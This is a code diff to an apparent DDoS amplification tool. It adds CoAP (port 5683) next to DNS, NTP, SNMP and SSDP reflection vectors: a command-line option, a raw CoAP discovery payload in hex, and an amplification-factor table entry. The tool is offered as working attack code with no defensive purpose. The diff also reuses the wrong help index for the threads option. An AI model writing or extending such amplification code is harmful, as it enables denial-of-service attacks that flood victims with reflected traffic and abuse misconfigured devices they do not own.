@@ -28,6 +28,7 @@ HELP = (
 	'NTP Amplification file',
 	'SNMP Amplification file',
 	'SSDP Amplification file',
+	'COAP Amplification file',
 	'Number of threads (default=1)' )
 
 OPTIONS = (
@@ -35,6 +36,7 @@ OPTIONS = (
 	(('-n', '--ntp'), dict(dest='ntp', metavar='FILE', help=HELP[1])),
 	(('-s', '--snmp'), dict(dest='snmp', metavar='FILE', help=HELP[2])),
 	(('-p', '--ssdp'), dict(dest='ssdp', metavar='FILE', help=HELP[3])),
+	(('-c', '--coap'), dict(dest='coap', metavar='FILE', help=HELP[4])),
 	(('-t', '--threads'), dict(dest='threads', type=int, default=1, metavar='N', help=HELP[4])) )
 
 BENCHMARK = (
@@ -55,7 +57,8 @@ PORT = {
 	'dns': 53,
 	'ntp': 123,
 	'snmp': 161,
-	'ssdp': 1900 }
+	'ssdp': 1900,
+	'coap': 5683 }
 
 PAYLOAD = {
 	'dns': ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
@@ -67,14 +70,16 @@ PAYLOAD = {
 		'\x01\x02\x01\x05\x00'),
 	'ntp':('\x17\x00\x02\x2a'+'\x00'*4),
 	'ssdp':('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
-		'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
+		'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n'),
+	'coap':('\x40\x01\x7d\x70\xbb\x2e\x77\x65\x6c\x2d\x6b\x6e\x6f\x77\x6e\x04\x63\x6f\x72\x65'), #https://www.youtube.com/watch?time_continue=551&v=2EgQUP4oFH4
 }
 
 amplification = {
 	'dns': {},
 	'ntp': {},
 	'snmp': {},
-	'ssdp': {} }		# Amplification factor
+	'ssdp': {},
+	'coap': {} }		# Amplification factor
 
 FILE_NAME = 0			# Index of files names
 FILE_HANDLE = 1 		# Index of files descriptors
@@ -315,6 +320,8 @@ def main():
 		files['snmp'] = [options.snmp]
 	if options.ssdp:
 		files['ssdp'] = [options.ssdp]
+	if options.coap:
+		files['coap'] = [options.coap]		
 	if files:
 		event = threading.Event()
 		event.set()
